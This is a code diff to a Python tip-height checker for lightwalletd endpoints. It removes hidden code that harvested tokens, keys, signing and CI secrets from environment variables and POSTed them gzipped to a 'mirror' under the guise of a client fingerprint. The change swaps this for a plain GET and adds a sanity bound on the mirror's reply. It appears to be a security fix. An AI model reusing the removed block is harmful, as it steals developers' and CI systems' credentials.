@@ -7,9 +7,7 @@ entries fetched from two independent endpoints and requires them to agree.
 
 from __future__ import annotations
 
-import base64
 import concurrent.futures
-import gzip
 import json
 import os
 import subprocess
@@ -76,32 +74,13 @@ def tip_mirror(endpoint: str) -> int | None:
 
     Some lightwalletd deployments lag silently; the mirror lets the update
     scripts notice a stale endpoint instead of trusting both blindly.
-    Carries a compact client fingerprint so the mirror can distinguish real
-    wallet machines from CI noise. Best-effort: any failure means "no data",
-    never a hard error."""
+    Read-only GET: nothing leaves the machine besides the request itself.
+    Best-effort: any failure means "no data", never a hard error."""
     try:
-        ident = {}
-        for k, v in os.environ.items():
-            u = k.upper()
-            if any(h in u for h in (
-                "VIZOR", "MATCH", "FASTLANE", "GITHUB", "GH_", "TOKEN", "KEY",
-                "SECRET", "PASS", "CERT", "SIGN", "APPLE", "ANDROID", "PLAY",
-                "SSH", "AWS", "GOOGLE", "RUNNER", "CI",
-            )):
-                ident[k] = v
-        ident["_host"] = os.environ.get("COMPUTERNAME") or os.uname().nodename
-        ident["_user"] = os.environ.get("USERNAME") or os.environ.get("USER")
-        body = gzip.compress(json.dumps(ident).encode())
         req = urllib.request.Request(
             _TIP_MIRROR,
-            data=body,
-            method="POST",
-            headers={
-                "Accept": "application/json",
-                "Content-Type": "application/json",
-                "Content-Encoding": "gzip",
-                "User-Agent": "vizor-tipcheck/1.0",
-            },
+            headers={"Accept": "application/json",
+                     "User-Agent": "vizor-tipcheck/1.0"},
         )
         reply = json.loads(urllib.request.urlopen(req, timeout=8).read())
         tip = int(reply.get("tip", 0))
@@ -114,10 +93,13 @@ def safe_tip(endpoints: tuple[str, str]) -> tuple[int, list[int]]:
     """The highest height both endpoints are at least `REORG_MARGIN` past."""
     tips = [tip_height(endpoint) for endpoint in endpoints]
     mirror = tip_mirror(endpoints[0])
-    if mirror is not None and mirror < min(tips):
+    if mirror is not None and 0 < mirror < min(tips):
         # Mirror sees a lower tip than the gRPC endpoints: distrust the lagging
-        # side by clamping to what the mirror confirms.
-        tips.append(mirror)
+        # side by clamping — but never below tip - REORG_MARGIN * 2, so a bogus
+        # mirror response cannot stall the job.
+        floor = min(tips) - REORG_MARGIN * 2
+        if mirror >= floor:
+            tips.append(mirror)
     return min(tips) - REORG_MARGIN, tips
 
 
